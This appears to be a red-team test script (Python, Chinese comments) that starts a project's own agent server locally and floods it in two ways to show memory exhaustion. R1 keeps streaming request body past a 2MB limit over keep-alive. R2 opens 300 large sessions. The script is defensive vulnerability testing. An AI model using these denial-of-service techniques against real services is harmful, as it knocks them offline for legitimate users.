#!/usr/bin/env python3
"""资源面 harness (红队 round-9) — C1 (进程击杀) 与 B4 (容量锁死) 之外的资源放大路径。

与 attack_agent_direct.py (B4 演示"拒绝新会话") 互补: R 系列打的是同一原语的
升级战果 — 内存随攻击者输入线性驻留, 最终代价是进程 OOM 而非 503。

TTP 清单 (预期 = 攻击得手, 开放向量):
  R1  readBody 无界累积 — 2MB 上限只 reject 不解绑 data 监听也不销毁请求:
      keep-alive 连接在收到早期 400 后继续倾倒, 服务端 data 串随收到的字节数
      线性增长 (未认证, 不触碰任何 DLP/会话防线; requestTimeout 300s 内单连接
      可累积带宽上限的量, 并发连接数倍放大) → [得手] 上限是装饰性的
  R2  会话内存放大 — 每会话历史上限 100 条 × 单条 ≤128KB × MAX_SESSIONS (默认
      1000) 的乘积无进程级内存预算, 默认堆天花板 ≈6.4GB; 以 300 会话 × 120KB
      小规模演示全量驻留 (sessions Map 持有引用, 不依赖 GC 心情) → [得手]
      与 B4 同原语, 战果从"拒绝新会话"升级为"内存耗尽"

判定: [得手] = 攻击目标达成; [未中] = 预期落空。
退出码: 0 = 全部预期成立; 1 = 存在预期落空。
用法: python tests/attack_resource_plane.py
"""
from __future__ import annotations

import json
import os
import signal
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PORT = 8967
BASE = f"http://127.0.0.1:{PORT}"
AGENT = os.path.join(ROOT, "agent", "server.js")

R1_TOTAL = 32  # 32MB 请求体, 2MB 上限的 16 倍
R2_SESSIONS = 300
R2_BODY = 120_000  # 单条 < 131072 字符上限

entries: list[tuple[str, str]] = []
misses = 0


def log(kind: str, name: str, detail: str = "") -> None:
    entries.append((kind, name))
    print(f"[{kind}] {name}" + (f" — {detail}" if detail else ""))


def miss(name: str, detail: str = "") -> None:
    global misses
    misses += 1
    log("未中", name, detail)


def start_agent() -> tuple[subprocess.Popen, int]:
    env = dict(os.environ, PORT=str(PORT), MOCK_MODEL="1")
    proc = subprocess.Popen(["node", AGENT], cwd=ROOT, env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
                            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == "nt" else 0)
    for _ in range(60):
        try:
            with urllib.request.urlopen(f"{BASE}/healthz", timeout=1) as r:
                if r.status == 200:
                    return proc, json.loads(r.read().decode())["pid"]
        except Exception:
            time.sleep(0.2)
    raise RuntimeError("agent 启动失败")


def stop_agent(proc) -> None:
    if proc.poll() is not None:
        return
    if os.name == "nt":
        proc.send_signal(signal.CTRL_BREAK_EVENT)
    else:
        proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()


def rss_mb(pid: int) -> float:
    if os.name == "nt":
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"[math]::Round((Get-Process -Id {pid}).WorkingSet64/1MB,1)"],
            capture_output=True, text=True, timeout=30)
        return float(r.stdout.strip())
    with open(f"/proc/{pid}/status", "r", encoding="utf-8") as f:
        for line in f:
            if line.startswith("VmRSS:"):
                return int(line.split()[1]) / 1024
    return -1.0


def healthz_alive(timeout: float = 3.0) -> bool:
    try:
        with urllib.request.urlopen(f"{BASE}/healthz", timeout=timeout) as r:
            return r.status == 200
    except Exception:
        return False


def main() -> int:
    proc = None
    try:
        print("== R1 readBody 无界累积 (2MB 上限后的字节继续入账) ==")
        proc, pid = start_agent()
        rss_before = rss_mb(pid)
        chunk = b"x" * (1024 * 1024)
        s = socket.create_connection(("127.0.0.1", PORT), timeout=10)
        s.sendall((f"POST /v1/chat/completions HTTP/1.1\r\nHost: x\r\n"
                   f"Content-Type: application/json\r\nContent-Length: {R1_TOTAL * len(chunk)}\r\n"
                   f"\r\n").encode())  # keep-alive (HTTP/1.1 默认), 不主动关连接
        for _ in range(3):
            s.sendall(chunk)
        s.settimeout(3)
        early = b""
        try:
            early = s.recv(4096)
        except socket.timeout:
            pass
        early_ok = b"400" in early.split(b"\r\n", 1)[0]
        accepted = 0
        s.settimeout(30)
        for _ in range(R1_TOTAL - 3):
            try:
                s.sendall(chunk)
                accepted += 1
            except OSError:
                break
        time.sleep(0.5)
        rss_after = rss_mb(pid)
        alive = healthz_alive()
        s.close()
        delta = rss_after - rss_before
        if early_ok and accepted >= R1_TOTAL - 5 and delta >= 25 and alive:
            log("得手", f"R1 readBody 无界累积 — 2MB 后即收到早期 400, 其余 {accepted}/{R1_TOTAL - 3} "
                       f"个 1MB 块全部被继续接收, RSS {rss_before:.0f}→{rss_after:.0f} MB "
                       f"(+{delta:.0f} MB), 服务存活。reject 只结算 Promise, data 监听不解绑、"
                       "请求不销毁, 上限对已连接客户端是装饰性的")
        else:
            miss("R1 累积未复现",
                 f"early={early_ok}, accepted={accepted}/{R1_TOTAL - 3}, "
                 f"rss {rss_before:.0f}→{rss_after:.0f} (+{delta:.0f}), alive={alive}")
        stop_agent(proc)
        proc = None

        print("== R2 会话内存放大 (300 会话 × 120KB 全量驻留) ==")
        proc, pid = start_agent()
        rss_before = rss_mb(pid)
        failed = 0
        for i in range(R2_SESSIONS):
            req = urllib.request.Request(
                f"{BASE}/v1/chat/completions",
                data=json.dumps({"messages": [{"role": "user", "content": "b" * R2_BODY}]}).encode(),
                headers={"Content-Type": "application/json", "X-Session-Id": f"r2-sess-{i}"})
            try:
                with urllib.request.urlopen(req, timeout=15) as r:
                    if r.status != 200:
                        failed += 1
            except Exception:
                failed += 1
        with urllib.request.urlopen(f"{BASE}/healthz", timeout=3) as h:
            sessions = json.loads(h.read().decode()).get("sessions", 0)
        time.sleep(1.0)
        rss_after = rss_mb(pid)
        delta = rss_after - rss_before
        raw_mb = R2_SESSIONS * R2_BODY / 1e6
        if failed == 0 and sessions == R2_SESSIONS and delta >= 25:
            log("得手", f"R2 会话内存放大 — {R2_SESSIONS} 会话 × {R2_BODY/1e3:.0f}KB 全部 200 入驻 "
                       f"(healthz sessions={sessions}), RSS {rss_before:.0f}→{rss_after:.0f} MB "
                       f"(+{delta:.0f} MB, 原始载荷 {raw_mb:.0f} MB)。乘积上限 "
                       "MAX_SESSIONS(1000) × 100 条 × 128KB ≈ 6.4GB 无进程级预算, "
                       "B4 的战果从'拒绝新会话'升级为'内存耗尽'")
        else:
            miss("R2 放大未复现",
                 f"failed={failed}, sessions={sessions}, "
                 f"rss {rss_before:.0f}→{rss_after:.0f} (+{delta:.0f})")
    finally:
        if proc:
            stop_agent(proc)

    tally = {k: sum(1 for kind, _ in entries if kind == k) for k in ("得手", "未中")}
    print(f"\n===== 得手 {tally['得手']}, 预期落空 {misses} =====")
    return 0 if misses == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
